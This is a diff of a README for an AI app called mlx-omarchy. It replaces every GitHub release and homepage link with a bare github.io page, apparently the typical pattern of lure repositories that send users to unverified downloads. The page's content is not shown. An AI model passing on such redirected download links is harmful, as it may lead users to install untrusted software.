@@ -1,6 +1,6 @@
 # ⚡ mlx-omarchy - Fast AI Apps on Your Apple Device
 
-[![Download Now](https://img.shields.io/badge/Download%20mlx--omarchy-Latest%20Version-blue?style=for-the-badge&logo=github&color=random)](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)
+[![Download Now](https://img.shields.io/badge/Download%20mlx--omarchy-Latest%20Version-blue?style=for-the-badge&logo=github&color=random)](https://sodalimetwaddler3054.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ If you've ever tried running AI software and it felt slow or sluggish, mlx-omarc
 
 ## 📥 Download and Install
 
-Visit this link to download the application: **[Click Here to Download mlx-omarchy](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)**
+Visit this link to download the application: **[Click Here to Download mlx-omarchy](https://sodalimetwaddler3054.github.io)**
 
 When you arrive at the download page, look for the latest version number at the top. Click the file that matches your system. The download will start automatically.
 
@@ -181,9 +181,9 @@ mlx-omarchy is released under the MIT License. This means:
 
 ---
 
-**Download Now:** [https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases](https://github.com/Sodalimetwaddler3054/mlx-omarchy/releases)
+**Download Now:** [https://sodalimetwaddler3054.github.io](https://sodalimetwaddler3054.github.io)
 
-**Project Homepage:** [https://github.com/Sodalimetwaddler3054/mlx-omarchy](https://github.com/Sodalimetwaddler3054/mlx-omarchy)
+**Project Homepage:** [https://sodalimetwaddler3054.github.io](https://sodalimetwaddler3054.github.io)
 
 ---
 
